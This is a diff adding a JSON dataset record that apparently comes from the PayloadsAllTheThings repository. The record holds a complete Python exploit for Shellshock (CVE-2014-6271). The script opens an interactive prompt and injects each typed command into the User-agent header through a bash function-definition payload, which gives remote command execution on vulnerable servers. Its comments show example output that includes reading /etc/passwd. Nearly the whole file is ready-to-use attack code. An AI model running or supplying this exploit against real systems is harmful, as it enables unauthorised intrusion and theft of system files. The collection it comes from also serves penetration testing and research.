@@ -1,0 +1,7 @@
+{
+    "code": "#!/usr/bin/python\n\n# Successful Output:\n# # python shell_shocker.py <VulnURL>\n# [+] Attempting Shell_Shock - Make sure to type full path\n# ~$ /bin/ls /\n# bin\n# boot\n# dev\n# etc\n# ..\n# ~$ /bin/cat /etc/passwd\n\nfrom __future__ import print_function\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import input\nimport sys, urllib.request, urllib.error, urllib.parse\n\nif len(sys.argv) != 2:\n        print(\"Usage: shell_shocker <URL>\")\n        sys.exit(0)\n\nURL=sys.argv[1]\nprint(\"[+] Attempting Shell_Shock - Make sure to type full path\")\n\nwhile True:\n        command=input(\"~$ \")\n        opener=urllib.request.build_opener()\n        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]\n        try:\n                response=opener.open(URL)\n                for line in response.readlines():\n                        print(line.strip())\n        except Exception as e: print(e)",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Shellshock CVE-2014-6271.py",
+    "license": "MIT",
+    "language": "python"
+}
